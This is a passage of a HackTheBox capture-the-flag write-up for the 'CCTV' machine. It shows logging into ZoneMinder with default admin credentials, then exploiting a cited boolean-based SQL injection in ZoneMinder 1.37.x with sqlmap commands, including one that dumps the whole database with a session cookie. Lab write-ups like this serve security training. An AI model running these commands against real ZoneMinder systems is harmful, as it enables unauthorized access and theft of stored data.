
## User Flag

Lets add to our DNS and go to the http website

``` bash
~HTB/CCTV:$ sudo echo "10.129.5.231 cctv.htb" >> /etc/hosts
```

![MainPage](https://github.com/AmnesiacDev/HackTheBox-Writeups/blob/main/HackTheBox/CCTV/Images/MainPage.png)

Clicking the "Staff Login" Button takes us to a ZoneMinder CMS login page, randomly trying "admin" for both username and password surprisingly works for default credintials

![Login](https://github.com/AmnesiacDev/HackTheBox-Writeups/blob/main/CCTV/Images/adminLogin.png)

![console](https://github.com/AmnesiacDev/HackTheBox-Writeups/blob/main/CCTV/Images/Console.png)

First thing I noticed is the version **1.37.63** doing some small google searches I found this exploit for this version of ZoneMinder

[Boolean-based SQL Injection in ZoneMinder v1.37.* <= 1.37.64](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3)

Original PoC sqlmap command
```bash
sqlmap -u 'http://hostname_or_ip/zm/index.php?view=request&request=event&action=removetag&tid=1'
```

My more aggressive sqlmap command to extract as much as possible from the database, this will take about 10 to 15 minutes to finish depending on your VM
```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
--cookie="ZMSESSID=9je2r7kgiiet5cognmdlfe4vhi" \
--dbms=mysql \
--risk=1 \
--level=5 \
--threads=5 \
--random-agent \
--batch \
--dump-all \
--output-dir=sqlmap_output
```

